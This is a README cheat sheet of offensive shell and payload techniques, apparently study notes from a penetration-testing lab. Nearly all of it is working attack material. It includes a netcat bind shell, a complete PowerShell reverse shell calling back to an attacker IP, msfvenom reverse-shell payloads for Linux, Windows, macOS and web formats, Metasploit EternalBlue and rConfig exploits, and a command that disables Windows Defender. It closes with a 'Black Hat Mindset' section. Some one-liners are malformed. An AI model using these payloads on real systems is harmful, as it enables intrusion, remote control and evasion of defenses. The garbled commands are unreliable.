# Basic Methodology - Shells and Payloads

This README explores techniques for creating and using shells and payloads to gain remote access to target systems.

## Table of Contents

- [Introduction](#introduction)
- [Setup and Prerequisites](#setup-and-prerequisites)
- [Netcat Listener and Connection](#netcat-listener-and-connection)
- [Netcat Bind Shell](#netcat-bind-shell)
- [PowerShell Reverse Shell](#powershell-reverse-shell)
- [Disabling Windows Defender Real-Time Monitoring](#disabling-windows-defender-real-time-monitoring)
- [Using Metasploit for Shells](#using-metasploit-for-shells)
- [Generating Payloads with msfvenom](#generating-payloads-with-msfvenom)
- [Exploiting Vulnerabilities with Metasploit](#exploiting-vulnerabilities-with-metasploit)
- [Spawning Interactive Shells on Linux](#spawning-interactive-shells-on-linux)
- [Enumeration for Privilege Escalation](#enumeration-for-privilege-escalation)
- [Web Shell Locations](#web-shell-locations)
- [Black Hat Mindset](#black-hat-mindset)
- [Resources](#resources)

## Introduction

Shells and payloads are essential for gaining remote access to target systems, executing commands, and maintaining persistence. This guide covers setting up listeners with netcat, generating reverse shells with PowerShell and msfvenom, exploiting vulnerabilities with Metasploit, and spawning interactive shells on Linux systems.

## Setup and Prerequisites

- **Environment**: Linux host for most commands; Windows host for PowerShell and specific Metasploit exploits.
- **Tools**: Install netcat (e.g., `apt install netcat`), metasploit-framework, msfvenom, Python, Perl, Ruby, Lua, awk, find, vim, and ensure `/usr/share/webshells/laudanum` and `/usr/share/nishang/Antak-WebShell` are accessible (on ParrotOS/Pwnbox).
- **IP Address**: Identify the attack host IP (e.g., 10.10.14.113, 10.129.41.200).
- **Permissions**: Administrative access may be required for some commands (e.g., disabling Windows Defender, running Metasploit exploits).

## Netcat Listener and Connection

Set up a listener and connect to it for a reverse shell.

```bash
# Starts a netcat listener on the specified port (Linux)
sudo nc -lvnp <port #>

# Connects to the netcat listener (Linux)
nc -nv <ip address of computer with listener started> <port being listened on>
```

Example:
```bash
# Listener
sudo nc -lvnp 7777

# Connect
nc -nv 10.129.41.200 7777
```

## Netcat Bind Shell

Serve a shell to remote connections.

```bash
# Creates a bind shell using /bin/bash, serving it via netcat
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

Usage:
```bash
# Connect from another host
nc 10.129.41.200 7777
```

## PowerShell Reverse Shell

Generate a PowerShell reverse shell.

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Setup:
```bash
# Listener
sudo nc -lvnp 443
```

## Disabling Windows Defender Real-Time Monitoring

Bypass Windows Defender for payload execution.

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

## Using Metasploit for Shells

Drop into a system shell or exploit vulnerabilities with Metasploit.

```bash
# Select the psexec exploit to gain a shell via SMB
msf6 > use exploit/windows/smb/psexec

# Drop into a system shell from a Meterpreter session
meterpreter > shell

# Scan for MS17-010 vulnerability
msf6 > use auxiliary/scanner/smb/smb_ms17_010

# Exploit MS17-010 to gain a shell
msf6 > use exploit/windows/smb/ms17_010_psexec

# Exploit rConfig 3.9.6 for a shell
msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
```

## Generating Payloads with msfvenom

Create reverse shell payloads for various platforms.

```bash
# Linux reverse shell (ELF)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > nameoffile.elf

# Windows reverse shell (EXE)
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > nameoffile.exe

# macOS reverse shell (Mach-O)
msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho > nameoffile.macho

# ASP Meterpreter reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp > nameoffile.asp

# JSP reverse shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw > nameoffile.jsp

# WAR reverse shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > nameoffile.war
```

Usage:
```bash
# Set up a listener
sudo nc -lvnp 443  # or use Metasploit's exploit/multi/handler
```

## Exploiting Vulnerabilities with Metasploit

Target specific vulnerabilities for shell access.

```bash
# Scan for MS17-010 (EternalBlue) vulnerability
msf6 > use auxiliary/scanner/smb/smb_ms17_010

# Exploit MS17-010 to gain a shell
msf6 > use exploit/windows/smb/ms17_010_psexec

# Exploit rConfig 3.9.6 for a shell
msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
```

## Spawning Interactive Shells on Linux

Spawn interactive shells using various methods.

```bash
# Python
python -c 'import pty; pty.spawn("/bin/sh")'

# Basic shell
/bin/sh -i

# Perl
perl —e 'exec "/bin/sh";'

# Ruby
ruby: exec "/bin/sh"

# Lua
lua: os.execute('/bin/sh')

# AWK
awk 'BEGIN {system("/bin/sh")}'

# Find with AWK
find / -name nameoffile 'exec /bin/awk 'BEGIN {system("/bin/sh")}' ;

# Find direct
find . -exec /bin/sh \; -quit

# Vim (useful for escaping jail shells)
vim -c ':!/bin/sh'
```

## Enumeration for Privilege Escalation

Identify opportunities for privilege escalation.

```bash
# List files and permissions
ls -la <path/to/fileorbinary>

# Display commands the current user can run with sudo
sudo -l
```

## Web Shell Locations

Access pre-installed web shells on ParrotOS/Pwnbox.

- `/usr/share/webshells/laudanum` - Location of Laudanum web shells
- `/usr/share/nishang/Antak-WebShell` - Location of Antak web shell

## Black Hat Mindset

- **Gain Access**: Use netcat, PowerShell, and Metasploit to establish remote shells.
- **Bypass Defenses**: Disable Windows Defender and use stealthy payloads to avoid detection.
- **Exploit Vulnerabilities**: Target known exploits (e.g., MS17-010, rConfig) for shell access.
- **Stay Silent**: Use bind shells and interactive shell-spawning to maintain access discreetly.

## Resources

- [Netcat Manual](https://netcat.sourceforge.net/)
- [Metasploit Documentation](https://docs.metasploit.com/)
- [msfvenom Payloads](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)
- [Nishang GitHub](https://github.com/samratashok/nishang)

